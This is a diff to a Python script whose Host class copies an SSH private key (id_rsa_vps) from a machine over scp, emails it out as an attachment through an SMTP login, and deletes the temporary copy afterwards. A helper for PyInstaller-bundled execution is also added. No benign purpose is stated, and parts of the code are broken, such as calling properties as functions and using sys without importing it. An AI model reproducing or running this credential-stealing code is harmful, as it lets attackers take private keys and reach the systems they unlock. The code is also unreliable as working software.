@@ -15,6 +15,7 @@
 
 """
 
+import os
 import smtplib
 import time 
 
@@ -31,26 +32,6 @@ class Host(object):
     self.server = server
     self.OS = os
     self.eMail = email
-
-  @property
-  def windowsTEMP(self):
-    directory = "C:\\Windows\\Temp\\"
-    return directory
-
-  @property
-  def linuxTEMP(self):
-    directory = "~/.ssh/"
-    return directory
-
-  @property
-  def privateKey(self):
-    key = "id_rsa"
-    return key
-
-  @property
-  def temporaryKey(self):
-    key = "id_rsa_vps"
-    return key
 
   @staticmethod
   def email_private_key(self):
@@ -96,13 +77,13 @@ class Host(object):
     server.starttls()
     server.login(self.eMail[0], self.eMail[1])
 
-    scp_command = "scp snow@192.168.0.5:~/.ssh/ " + self.windowsTEMP + self.temporaryKey + " ."
+    scp_command = "scp snow@192.168.0.5:~/.ssh/id_rsa_vps C:\\Temp\\"
 
     CMD().execute(scp_command)
 
     time.sleep(10)
 
-    private_key = open(self.temporaryKey(), 'r')
+    private_key = open("C:\\Temp\\id_rsa_vps", "r")
 
     mail = MIMEMultipart()
     mail["From"] = self.eMail[0]
@@ -112,7 +93,7 @@ class Host(object):
     content = private_key.read()
     mail.attach(MIMEText(content, "plain"))
 
-    attachment = open(self.windowsTEMP() + self.temporaryKey(), "r")
+    attachment = open("C:\\Temp\\id_rsa_vps", "r")
 
     meta = MIMEBase('application', 'octet-stream')
 
@@ -120,7 +101,7 @@ class Host(object):
 
     encoders.encode_base64(meta)
 
-    meta.add_header('Content-Disposition', "attachment; filename= %s" % self.privateKey())
+    meta.add_header('Content-Disposition', "attachment; filename= %s" % "id_rsa")
 
     mail.attach(meta)
 
@@ -132,3 +113,30 @@ class Host(object):
 
     private_key.close()
     attachment.close()
+
+    os.remove("C:\\Temp\\id_rsa_vps")
+
+  @staticmethod
+  def MEI():
+    directory = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__))) + "\\"
+    return directory
+    
+  @property
+  def windowsTEMP(self):
+    directory = "C:\\Temp\\"
+    return directory
+
+  @property
+  def linuxTEMP(self):
+    directory = "~/.ssh/"
+    return directory
+
+  @property
+  def privateKey(self):
+    key = "id_rsa"
+    return key
+
+  @property
+  def temporaryKey(self):
+    key = "id_rsa_vps"
+    return key
